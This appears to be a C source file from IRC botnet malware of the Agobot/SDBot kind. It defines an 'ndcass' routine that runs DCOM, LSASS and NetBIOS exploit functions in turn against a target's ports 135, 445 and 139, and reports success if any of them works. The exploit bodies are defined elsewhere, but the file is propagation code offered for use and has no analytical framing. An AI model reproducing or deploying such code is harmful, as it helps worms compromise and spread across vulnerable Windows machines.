/// Basicly a scanner that scans every exploit u specify ////
////////////////   Exploit^   ///////////////////////////////


#include "../includes/includes.h"
#include "../includes/functions.h"
#include "../includes/externs.h"

#ifndef NO_LSASS
#ifndef NO_DCOM
#ifndef NO_NETBIOS
#ifndef NO_NDCASS
BOOL ndcass(EXINFO exinfo)
{
	exinfo.port = 135;
	BOOL bDCOM = Dcom(exinfo);
	
	exinfo.port = 445;
	BOOL bLSASS = Lsass(exinfo);

	exinfo.port = 139;
	BOOL bNETBIOS = NetBios(exinfo);
	exinfo.port = 445;
	BOOL bNTPASS = NetBios(exinfo);

	return bDCOM || bLSASS || bNETBIOS || bNTPASS ? TRUE : FALSE;
}
#endif
#endif
#endif
#endif

